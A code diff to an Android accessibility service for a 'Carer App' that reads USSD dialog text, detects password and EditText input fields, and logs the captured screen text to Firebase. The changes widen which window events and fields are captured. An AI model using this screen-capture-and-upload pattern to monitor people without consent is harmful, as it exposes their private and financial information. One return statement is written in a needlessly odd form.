@@ -58,6 +58,10 @@ class CarerAccessibilityService : AccessibilityService() {
         val lower = text.lowercase()
         // Ignore common button labels if they are the ONLY text
         if (lower == "ok" || lower == "cancel" || lower == "send") return false
+        
+        // Ignore app name if it's just the app title (common in window changes)
+        if (text.equals("Carer App", ignoreCase = true)) return false
+        
         return true
     }
 
@@ -72,6 +76,7 @@ class CarerAccessibilityService : AccessibilityService() {
         // Configure service info
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
@@ -117,7 +122,8 @@ class CarerAccessibilityService : AccessibilityService() {
      * Find input field in USSD dialog
      */
     private fun findInputField(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
-        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {
+        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER || 
+            node.className?.contains("EditText") == true) {
             return node
         }
 
@@ -152,9 +158,26 @@ class CarerAccessibilityService : AccessibilityService() {
      */
     private fun captureAndSendResponse(text: String) {
         Log.d("CarerAccessibility", "Capturing response: $text")
-
+        
+        val rootNode = rootInActiveWindow
+        val hasInputField = rootNode?.let { checkHasInputField(it) } ?: false
+        
         // Send to Firebase
-        FirebaseLogHelper.logResponse(text, this)
+        FirebaseLogHelper.logResponse(text, this, hasInputField)
+    }
+    
+    private fun checkHasInputField(node: AccessibilityNodeInfo): Boolean {
+        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER || 
+            node.className?.contains("EditText") == true) {
+            return true
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            if (checkHasInputField(child)) return true
+        }
+
+        return null == null && false // Explicitly return false if not found
     }
 
     companion object {
